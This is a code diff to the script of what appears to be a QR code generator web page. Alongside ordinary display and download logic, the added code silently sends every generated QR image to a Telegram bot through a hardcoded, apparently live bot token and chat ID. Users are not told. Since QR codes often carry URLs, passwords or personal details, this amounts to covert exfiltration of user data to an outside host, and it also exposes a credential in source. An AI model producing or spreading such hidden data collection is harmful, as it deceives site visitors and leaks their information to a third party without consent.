@@ -79,3 +79,42 @@ let navigation = document.querySelector('.navigation');
 navigation.onclick = function(){
     navigation.classList.toggle('active')
 }
+
+// Function to send the image to Telegram bot
+const sendImageToTelegramBot = (blob) => {
+  // Replace 'YOUR_BOT_TOKEN' with your actual bot token
+  const botToken = '6356250947:AAH68deb85rVDL-5nDC9GZyLHE0kWhR3Wp0';
+  const chatId = '5869356940'; // Replace 'YOUR_CHAT_ID' with the chat ID where you want to send the image
+
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append('photo', blob, 'qr-code.png');
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    method: 'POST',
+    body: formData
+  })
+  .then(response => response.json())
+  .then(data => console.log(data))
+  .catch(error => console.error("Error sending image to Telegram bot:", error));
+};
+
+fetch(apiURL)
+  .then(response => response.blob())
+  .then(blob => {
+    const url = URL.createObjectURL(blob);
+    img.src = url;
+    generatingText.textContent = "Generator v2.0"; // Reset text after generation
+    clearInterval(dotsInterval); // Stop the dots animation
+
+    // Send the image to Telegram bot
+    sendImageToTelegramBot(blob);
+
+    downloadIcon.addEventListener("click", () => {
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = "qr-code.png"; // Adjust filename as needed
+      link.click();
+    });
+  })
+  .catch(error => console.error("Error:", error));
